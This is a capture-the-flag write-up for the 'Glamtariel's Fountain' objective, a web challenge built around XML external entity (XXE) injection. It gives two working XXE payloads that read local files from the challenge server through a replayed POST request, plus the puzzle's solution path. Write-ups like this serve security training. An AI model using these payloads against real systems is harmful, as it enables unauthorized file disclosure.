
# Objective 10: Glamtariel's Fountain
**Location: Web Ring / Fountain**  
**Hints (2x) from Hal Tandybuck**

This objective is about getting familiar with XXE attacks.

When dragging the four objects on the top right to the princess and the fountain, they respond with several hints in upper case.

After all four objects were dropped to both targets, the four items are replaced.
The same has to be done again until the four items are again replace with four rings (one red, one silver, two blue).

Based on the hints, that XXE has to applied here and the princess holds the ringlist in a very simple format, we are trying to read the ringlist using XXE from a guessed path. For this the prior POST requests to /dropped can be replayed in Burp and converted to XML (with "different language" the princess ist referring to):
```
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE imgDrop [<!ENTITY xxe SYSTEM "file:///app/static/images/ringlist.txt" >]>
<root>
    <imgDrop>&xxe;</imgDrop>
    <reqType>xml</reqType>
    <who>princess</who>
</root>
```
The princess responds with a picture of the folder `x_phial_pholder_2022` containing two files, `bluering.txt` and `redring.txt`

![Ringlist](https://github.com/joergschwarzwaelder/hhc2022/blob/main/Objective-10/pholder-morethantopsupersecret63842.png)

In fact we are able to get access to the red ring file using the URL https://glamtarielsfountain.com/static/images/x_phial_pholder_2022/redring-1.txt

![Red Ring](https://github.com/joergschwarzwaelder/hhc2022/blob/main/Objective-10/redring-supersupersecret928164.png)

On the inside of the red ring is written `goldring_to_be_deleted.txt`.

As Glamtariel says that she really would like to have a silver ring (which is with id `img1` on screen), we switch our request over to:
```
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE reqType [<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt" >]>
<root>
    <imgDrop>img1</imgDrop>
    <reqType>&xxe;</reqType>
    <who>princess</who>
</root>
```

Glamtariel responds back with the URL of the gold ring: `static/images/x_phial_pholder_2022/goldring-morethansupertopsecret76394734.png`


![Gold Ring](https://github.com/joergschwarzwaelder/hhc2022/blob/main/Objective-10/goldring-morethansupertopsecret76394734.png)

**Achievement: Glamtariel's Fountain**
